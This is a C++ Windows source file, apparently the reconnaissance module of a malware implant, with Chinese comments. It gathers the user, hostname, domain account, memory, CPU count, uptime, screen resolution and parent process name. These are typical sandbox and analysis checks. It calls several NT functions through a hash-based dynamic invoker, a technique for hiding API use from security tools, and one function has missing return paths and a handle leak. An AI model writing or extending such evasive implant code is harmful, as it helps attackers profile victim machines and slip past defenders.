#include "recon.h"

static auto& dynamicInvoker = DynamicInvoker::get_instance();


std::string getCurrentTime() {
    std::time_t now = std::time(nullptr);
    char* timeStr = std::ctime(&now);
    std::string result(timeStr);
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

std::string GetUsername() {
    WCHAR username[256];
    DWORD size = 256;

    if (GetUserNameW(username, &size)) {
        return WideToUtf8(username);
    }
    return "";
}

std::string GetHostname() {
    WCHAR hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerNameW(hostname, &size)) {
        return WideToUtf8(hostname);
    }
    return "";
}

std::string GetAccountPrivilege() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return "";
    }

    DWORD len = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &len);
    PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(len);
    if (!GetTokenInformation(token, TokenUser, tokenUser, len, &len)) {
        CloseHandle(token);
        free(tokenUser);
        return "";
    }

    WCHAR name[256], domain[256];
    DWORD nameLen = 256, domainLen = 256;
    SID_NAME_USE sidType;

    std::string result;
    if (LookupAccountSidW(NULL, tokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
        std::wstring raw = std::wstring(domain) + L"\\" + std::wstring(name);
        result = EscapeJsonString(WideToUtf8(raw));  // 转义
    }
    else {
        result = "";
    }

    CloseHandle(token);
    free(tokenUser);
    return result;
}

// 返回物理内存大小 单位GB
ULONG64 GetPhysicalMemory() {
    SYSTEM_MEMORY_USAGE_INFORMATION smui = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemMemoryUsageInformation, &smui, sizeof(SYSTEM_MEMORY_USAGE_INFORMATION), &size);
    return smui.TotalPhysicalBytes / (1024 * 1024 * 1024);
}

 // 返回CPU核心数
ULONG64 GetCpuCoreNum(){
    SYSTEM_BASIC_INFORMATION sbi = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemBasicInformation, &sbi, sizeof(SYSTEM_BASIC_INFORMATION), &size);

    return sbi.NumberOfProcessors;
}
// 返回系统启动时间（单位：秒）
ULONG64 GetBootTime(){
    return AR_getTickcount64() / 1000;
}
// 返回系统启动时间（单位：分钟）
ULONG64 GetBootTimeMinute() {
    return GetBootTime() / 60;
}
// TODO: 获取临时文件数量
ULONG64 GetTempFileNum(){
    return 0;
}

std::string GetResolution(){
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    return std::to_string(screenWidth) + "x" + std::to_string(screenHeight);
}

// TODO: convert to NT impl
std::string GetCurrentExeDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    std::string fullPath(path);
    size_t pos = fullPath.find_last_of("\\/");
    std::string dir = (pos != std::string::npos) ? fullPath.substr(0, pos) : fullPath;

    return EscapeJsonString(dir);  
}

// 获取父进程pid
DWORD GetParentProcessId() {
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationProcessStruct.funcAddr, NtQueryInformationProcessStruct.funcHash,
		GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    if (NT_SUCCESS(status)) {  
        return (DWORD)(pbi.InheritedFromUniqueProcessId);
    }
    else {
        return 0;
    }
}

// 返回父进程名
std::string GetParentProcessName() {
    DWORD pid = GetParentProcessId();
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)pid;
    
    NTSTATUS status  = dynamicInvoker.Invoke<NTSTATUS>(NtOpenProcessStruct.funcAddr, NtOpenProcessStruct.funcHash,
        &hProcess,PROCESS_QUERY_INFORMATION,&objAttr,&cid);

    if (NT_SUCCESS(status)) {
        BYTE buffer[0x200] = { 0 };
        ULONG retLen = 0;

        NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationProcessStruct.funcAddr, NtQueryInformationProcessStruct.funcHash,
            hProcess, ProcessImageFileName, buffer, sizeof(buffer), &retLen);
        
        if(!NT_SUCCESS(status)) return "";
        
        PUNICODE_STRING pImage = (PUNICODE_STRING)buffer;
        std::wstring imagePath(pImage->Buffer, pImage->Length / sizeof(WCHAR));

        CloseHandle(hProcess);
        return EscapeJsonString(WideToUtf8(imagePath));
    }
}